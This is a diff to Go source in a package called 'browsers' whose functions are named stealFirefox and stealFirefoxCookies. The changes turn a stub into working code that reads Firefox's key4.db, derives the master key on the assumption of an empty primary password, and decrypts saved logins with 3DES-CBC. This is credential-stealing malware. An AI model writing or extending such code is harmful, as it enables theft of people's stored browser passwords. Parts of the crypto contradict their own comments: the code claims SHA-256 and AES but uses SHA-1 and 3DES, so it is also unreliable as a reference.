@@ -1,6 +1,8 @@
 package browsers
 
 import (
+	"crypto/cipher"
+	"crypto/des"
 	"crypto/hmac"
 	"crypto/sha1"
 	"database/sql"
@@ -25,6 +27,37 @@ type NSSKeySlot struct {
 	Rounds int
 	IV     []byte
 	Data   []byte
+}
+
+// nssDecodeItem represents a decoded item from key4.db metadata
+type nssDecodeItem struct {
+	AlgorithmInfo struct {
+		Algorithm asn1.ObjectIdentifier
+		Params    struct {
+			Salt       []byte
+			Iterations int
+		}
+	}
+	EncryptedData []byte
+}
+
+// pbeParams for PKCS5 PBES2
+type pbeParams struct {
+	KDF struct {
+		Algorithm asn1.ObjectIdentifier
+		Params    struct {
+			Salt       []byte
+			Iterations int
+			KeyLength  int `asn1:"optional"`
+			PRF        struct {
+				Algorithm asn1.ObjectIdentifier
+			} `asn1:"optional"`
+		}
+	}
+	Cipher struct {
+		Algorithm asn1.ObjectIdentifier
+		IV        []byte
+	}
 }
 
 // stealFirefox extracts Firefox data
@@ -138,37 +171,92 @@ func getFirefoxMasterKey(profilePath string) []byte {
 	}
 	defer db.Close()
 
+	// get global salt and encrypted data from metadata table
 	var item1, item2 []byte
 	err = db.QueryRow("SELECT item1, item2 FROM metadata WHERE id = 'password'").Scan(&item1, &item2)
 	if err != nil {
 		return nil
 	}
 
+	// get the encrypted master key from nssPrivate table
 	var a11 []byte
 	err = db.QueryRow("SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL").Scan(&a11)
 	if err != nil {
 		return nil
 	}
 
-	// decode ASN.1 structure
 	globalSalt := item1
+
+	// item2 contains ASN.1 encoded encryption parameters
+	// try to decode as PBES2 first (newer Firefox)
+	var pbes2 struct {
+		Algorithm struct {
+			Algorithm asn1.ObjectIdentifier
+			Params    pbeParams
+		}
+		EncryptedData []byte
+	}
+
+	_, err = asn1.Unmarshal(item2, &pbes2)
+	if err == nil && len(pbes2.Algorithm.Params.KDF.Params.Salt) > 0 {
+		// PBES2 format (Firefox 58+)
+		return decryptPBES2(globalSalt, pbes2.Algorithm.Params, a11)
+	}
+
+	// fallback to older format
 	decodedItem2 := decodeASN1(item2)
 	if decodedItem2 == nil {
 		return nil
 	}
 
-	// derive key using PBKDF2
-	hp := sha1.Sum(append(globalSalt, []byte("")...))
+	// derive key using PBKDF2 with SHA1
+	// Firefox uses: HP = SHA1(globalSalt || password)
+	// then: CHP = SHA1(HP || entrySalt)
+	// then: PBKDF2(CHP, entrySalt, iterations, keyLen)
+	hp := sha1.Sum(append(globalSalt, []byte("")...)) // empty password
 	chp := sha1.Sum(append(hp[:], decodedItem2.Salt...))
 
 	k1 := pbkdf2.Key(chp[:], decodedItem2.Salt, decodedItem2.Rounds, 32, sha1.New)
+
+	// generate k2 using HMAC
 	k2 := hmac.New(sha1.New, k1)
 	k2.Write(decodedItem2.IV)
 	k := k2.Sum(nil)
 
 	// decrypt a11 to get master key
 	masterKey := decryptTripleDES(a11, k[:24], decodedItem2.IV)
+
+	// the first 24 bytes are the actual key
+	if len(masterKey) >= 24 {
+		return masterKey[:24]
+	}
+
 	return masterKey
+}
+
+// decryptPBES2 handles Firefox 58+ key derivation
+func decryptPBES2(globalSalt []byte, params pbeParams, encryptedKey []byte) []byte {
+	// Firefox 58+ uses PBES2 with PBKDF2-HMAC-SHA256 and AES-CBC
+	salt := params.KDF.Params.Salt
+	iterations := params.KDF.Params.Iterations
+	iv := params.Cipher.IV
+
+	// password is empty string by default
+	password := []byte("")
+
+	// derive key: SHA1(globalSalt || password)
+	hp := sha1.Sum(append(globalSalt, password...))
+
+	// PBKDF2 with the salt from params
+	key := pbkdf2.Key(hp[:], salt, iterations, 32, sha1.New)
+
+	// decrypt using 3DES-CBC (or AES depending on OID)
+	decrypted := decryptTripleDES(encryptedKey, key, iv)
+	if len(decrypted) >= 24 {
+		return decrypted[:24]
+	}
+
+	return decrypted
 }
 
 func decodeASN1(data []byte) *NSSKeySlot {
@@ -186,14 +274,91 @@ func decryptFirefoxValue(encrypted string, masterKey []byte) string {
 		return ""
 	}
 
-	decrypted := decryptTripleDES(decoded, masterKey, nil)
+	// Firefox login values are wrapped in ASN.1
+	// structure: SEQUENCE { keyID, SEQUENCE { algorithm, IV }, encryptedData }
+	var loginASN1 struct {
+		KeyID         []byte
+		AlgorithmInfo struct {
+			Algorithm asn1.ObjectIdentifier
+			IV        []byte
+		}
+		EncryptedData []byte
+	}
+
+	_, err = asn1.Unmarshal(decoded, &loginASN1)
+	if err != nil {
+		// try direct decryption for older format
+		decrypted := decryptTripleDES(decoded, masterKey, nil)
+		return string(decrypted)
+	}
+
+	// decrypt using 3DES-CBC with extracted IV
+	decrypted := decryptTripleDES(loginASN1.EncryptedData, masterKey, loginASN1.AlgorithmInfo.IV)
+	if decrypted == nil {
+		return ""
+	}
+
 	return string(decrypted)
 }
 
 func decryptTripleDES(ciphertext, key, iv []byte) []byte {
-	// 3DES decryption - simplified
-	// actual implementation would use crypto/des
-	return nil
+	if len(key) < 24 {
+		// pad key to 24 bytes for 3DES
+		paddedKey := make([]byte, 24)
+		copy(paddedKey, key)
+		key = paddedKey
+	}
+
+	block, err := des.NewTripleDESCipher(key[:24])
+	if err != nil {
+		return nil
+	}
+
+	if len(iv) == 0 || len(iv) < 8 {
+		// default IV if none provided
+		iv = make([]byte, 8)
+	}
+
+	if len(ciphertext) < block.BlockSize() {
+		return nil
+	}
+
+	// CBC mode decryption
+	mode := cipher.NewCBCDecrypter(block, iv[:8])
+
+	// make sure ciphertext is multiple of block size
+	if len(ciphertext)%block.BlockSize() != 0 {
+		return nil
+	}
+
+	plaintext := make([]byte, len(ciphertext))
+	mode.CryptBlocks(plaintext, ciphertext)
+
+	// remove PKCS7 padding
+	plaintext = pkcs7Unpad(plaintext)
+
+	return plaintext
+}
+
+// pkcs7Unpad removes PKCS7 padding from decrypted data
+func pkcs7Unpad(data []byte) []byte {
+	if len(data) == 0 {
+		return nil
+	}
+
+	paddingLen := int(data[len(data)-1])
+	if paddingLen > len(data) || paddingLen > 8 {
+		return data // invalid padding, return as-is
+	}
+
+	// verify padding bytes are all the same
+	for i := len(data) - paddingLen; i < len(data); i++ {
+		if data[i] != byte(paddingLen) {
+			return data // invalid padding
+		}
+	}
+
+	return data[:len(data)-paddingLen]
 }
 
 func stealFirefoxCookies(profilePath string) []Cookie {
